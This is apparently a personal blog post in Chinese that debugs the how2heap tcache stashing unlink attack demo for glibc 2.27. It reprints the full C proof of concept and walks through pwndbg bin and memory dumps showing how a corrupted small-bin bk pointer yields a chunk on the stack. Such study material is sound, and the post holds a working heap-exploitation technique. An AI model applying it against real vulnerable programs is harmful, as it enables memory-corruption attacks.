---
title: Tcache_stashing_unlink_atack调试记录
date: 2021-09-01
tags: PWN
categories: Technology
---

代码是how2heap中libc2.27的代码

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main(){
    unsigned long stack_var[0x10] = {0};
    unsigned long *chunk_lis[0x10] = {0};
    unsigned long *target;

    setbuf(stdout, NULL);

    printf("This file demonstrates the stashing unlink attack on tcache.\n\n");
    printf("This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n");
    printf("This technique can be used when you are able to overwrite the victim->bk pointer. Besides, it's necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n");
    printf("The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n");
    printf("This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we'll create the chunk on the stack.\n\n");

    // stack_var emulate the fake_chunk we want to alloc to
    printf("Stack_var emulates the fake chunk we want to alloc to.\n\n");
    printf("First let's write a writeable address to fake_chunk->bk to bypass bck->fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk->bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n");

    stack_var[3] = (unsigned long)(&stack_var[2]);

    printf("You can see the value of fake_chunk->bk is:%p\n\n",(void*)stack_var[3]);
    printf("Also, let's see the initial value of stack_var[4]:%p\n\n",(void*)stack_var[4]);
    printf("Now we alloc 9 chunks with malloc.\n\n");

    //now we malloc 9 chunks
    for(int i = 0;i < 9;i++){
        chunk_lis[i] = (unsigned long*)malloc(0x90);
    }

    //put 7 chunks into tcache
    printf("Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n");

    for(int i = 3;i < 9;i++){
        free(chunk_lis[i]);
    }

    printf("As you can see, chunk1 & [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n");

    //last tcache bin
    free(chunk_lis[1]);
    //now they are put into unsorted bin
    free(chunk_lis[0]);
    free(chunk_lis[2]);

    //convert into small bin
    printf("Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n");

    malloc(0xa0);// size > 0x90

    //now 5 tcache bins
    printf("Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n");

    malloc(0x90);
    malloc(0x90);

    printf("Now we emulate a vulnerability that can overwrite the victim->bk pointer into fake_chunk addr: %p.\n\n",(void*)stack_var);

    //change victim->bck
    /*VULNERABILITY*/
    chunk_lis[2][1] = (unsigned long)stack_var;
    /*VULNERABILITY*/

    //trigger the attack
    printf("Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n");

    calloc(1,0x90);

    printf("Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck->fd has been changed into a libc addr: %p\n\n",(void*)stack_var[2],(void*)stack_var[4]);

    //malloc and return our fake chunk on stack
    target = malloc(0x90);   

    printf("As you can see, next malloc(0x90) will return the region our fake chunk: %p\n",(void*)target);

    assert(target == &stack_var[2]);
    return 0;
}

```

那么就开始调试吧：

首先最开始有三个变量

```shell
pwndbg> info locals 
stack_var = {0 <repeats 16 times>}
chunk_lis = {0x0 <repeats 16 times>}
target = 0x7ffff7dde39f <_dl_lookup_symbol_x+319>
__PRETTY_FUNCTION__ = "main"
```

之后将stack_var[2]的地址放入了stack_var[3]中的位置：

```shell
pwndbg> info locals 
stack_var = {0, 0, 0, 140737488346768, 0 <repeats 12 times>}
chunk_lis = {0x0 <repeats 16 times>}
target = 0x7ffff7dde39f <_dl_lookup_symbol_x+319>
__PRETTY_FUNCTION__ = "main"
```

至于为什么这么放，是个很有意思的问题，后面会揭晓，继续往下看：

再接下来就是连续malloc了9次，并将返回的地址放入了chunk_list中：

```shell
pwndbg> info locals 
i = 0
stack_var = {0, 0, 0, 140737488346768, 0 <repeats 12 times>}
chunk_lis = {0x555555757260, 0x555555757300, 0x5555557573a0, 0x555555757440, 0x5555557574e0, 0x555555757580, 0x555555757620, 0x5555557576c0, 0x555555757760, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
target = 0x7ffff7dde39f <_dl_lookup_symbol_x+319>
__PRETTY_FUNCTION__ = "main"
```

然后将3到8的都free掉，tcache是FILO的，且每个最多放7个：

```shell
pwndbg> bin
tcachebins
0xa0 [  6]: 0x555555757760 —▸ 0x5555557576c0 —▸ 0x555555757620 —▸ 0x555555757580 —▸ 0x5555557574e0 —▸ 0x555555757440 ◂— 0x0
pwndbg> info locals 
stack_var = {0, 0, 0, 140737488346768, 0 <repeats 12 times>}
chunk_lis = {0x555555757260, 0x555555757300, 0x5555557573a0, 0x555555757440, 0x5555557574e0, 0x555555757580, 0x555555757620, 0x5555557576c0, 0x555555757760, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
target = 0x7ffff7dde39f <_dl_lookup_symbol_x+319>
__PRETTY_FUNCTION__ = "main"
```

在之后按照1,0,2的顺序free，放入unsorted bin中：

```shell
pwndbg> bin
tcachebins
0xa0 [  7]: 0x555555757300 —▸ 0x555555757760 —▸ 0x5555557576c0 —▸ 0x555555757620 —▸ 0x555555757580 —▸ 0x5555557574e0 —▸ 0x555555757440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x555555757390 —▸ 0x555555757250 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555757390
smallbins
empty
largebins
empty
```

之后申请了0xa0大小的chunk，unsorted中没有这么大的，全部放入smallbin中，然后从top chunk切割：

```shell
pwndbg> bin
tcachebins
0xa0 [  7]: 0x555555757300 —▸ 0x555555757760 —▸ 0x5555557576c0 —▸ 0x555555757620 —▸ 0x555555757580 —▸ 0x5555557574e0 —▸ 0x555555757440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0xa0: 0x555555757390 —▸ 0x555555757250 —▸ 0x7ffff7dcdd30 (main_arena+240) ◂— 0x555555757390
largebins
empty
pwndbg> heap
....
...
Free chunk (tcache) | PREV_INUSE
Addr: 0x555555757750
Size: 0xa1
fd: 0x5555557576c0

Allocated chunk | PREV_INUSE  < == 新申请的0xa0大小的chunk
Addr: 0x5555557577f0
Size: 0xb1

Top chunk | PREV_INUSE
Addr: 0x5555557578a0
Size: 0x20761
```

然后是两个malloc(0x90)，从tcache中拿：

```shell
pwndbg> bin
tcachebins
0xa0 [  5]: 0x5555557576c0 —▸ 0x555555757620 —▸ 0x555555757580 —▸ 0x5555557574e0 —▸ 0x555555757440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0xa0: 0x555555757390 —▸ 0x555555757250 —▸ 0x7ffff7dcdd30 (main_arena+240) ◂— 0x555555757390
largebins
empty
```

stack_var的地址：0x7fffffffde80。

然后就是这句话：

` chunk_lis[2][1] = (unsigned long)stack_var;`

就是将stack_var的地址放入chunl_lis[2]所指的地址中

```shell
pwndbg> print chunk_lis[2] 
$4 = (unsigned long *) 0x5555557573a0
pwndbg> print chunk_lis[2][1] 
$5 = 140737488346752 < = 也就是0x7fffffffde80
pwndbg> print &chunk_lis[2][1] 
$6 = (unsigned long *) 0x5555557573a8
```

就是说，将0x7ffff7dcdd30写入了0x5555557573a8中

```shell
pwndbg> x/16gx 0x555555757390
0x555555757390:	0x0000000000000000	0x00000000000000a1
0x5555557573a0:	0x0000555555757250	0x00007fffffffde80
0x5555557573b0:	0x0000000000000000	0x0000000000000000
0x5555557573c0:	0x0000000000000000	0x0000000000000000
0x5555557573d0:	0x0000000000000000	0x0000000000000000
0x5555557573e0:	0x0000000000000000	0x0000000000000000
0x5555557573f0:	0x0000000000000000	0x0000000000000000
0x555555757400:	0x0000000000000000	0x0000000000000000
```

也就是说，这么一改将smallbin的链表打乱了：

```shell
pwndbg> bin
tcachebins
0xa0 [  5]: 0x5555557576c0 —▸ 0x555555757620 —▸ 0x555555757580 —▸ 0x5555557574e0 —▸ 0x555555757440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0xa0 [corrupted]
FD: 0x555555757390 —▸ 0x555555757250 —▸ 0x7ffff7dcdd30 (main_arena+240) ◂— 0x555555757390
BK: 0x555555757250 —▸ 0x555555757390 —▸ 0x7fffffffde80 —▸ 0x7fffffffde90 ◂— 0x0
largebins
empty
pwndbg>
```

然后是calloc(1,0x90)

```shell
pwndbg> bin
tcachebins
0xa0 [  7]: 0x7fffffffde90 —▸ 0x5555557573a0 —▸ 0x5555557576c0 —▸ 0x555555757620 —▸ 0x555555757580 —▸ 0x5555557574e0 —▸ 0x555555757440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0xa0 [corrupted]
FD: 0x555555757390 —▸ 0x5555557576c0 ◂— 0x0
BK: 0x7fffffffde90 ◂— 0x0
largebins
empty

```

tcache bin 有剩余 (数量小于 `TCACHE_MAX_BINS` ) 时，同大小的 small bin 会放进 tcache 中 (这种情况可以用 `calloc` 分配同大小堆块触发，因为 `calloc` 分配堆块时不从 tcache bin 中选取)。在获取到一个 `smallbin` 中的一个 chunk 后会如果 tcache 仍有足够空闲位置，会将剩余的 small bin 链入 tcache ，在这个过程中只对第一个 bin 进行了完整性检查，后面的堆块的检查缺失。

所以，这次calloc的是0x555555757250这个chunk，而0x555555757390和0x7fffffffde80则放入了tcache中。

也就是说，这时stack_var[2]已经放入了tcache中，那么下次calloc即可得到位于stack的一个chunk：

```shell
pwndbg> bin
tcachebins
0xa0 [  6]: 0x5555557573a0 —▸ 0x5555557576c0 —▸ 0x555555757620 —▸ 0x555555757580 —▸ 0x5555557574e0 —▸ 0x555555757440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0xa0 [corrupted]
FD: 0x555555757390 —▸ 0x5555557576c0 ◂— 0x0
BK: 0x7fffffffde90 ◂— 0x0
largebins
empty
```

可以看到确实是这样：

```shell
pwndbg> info locals 
stack_var = {0, 0, 93824994341792, 0, 140737351834928, 0 <repeats 11 times>}
chunk_lis = {0x555555757260, 0x555555757300, 0x5555557573a0, 0x555555757440, 0x5555557574e0, 0x555555757581, 0x555555757620, 0x5555557576c0, 0x555555757760, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
target = 0x7fffffffde90
__PRETTY_FUNCTION__ = "main"
```





















































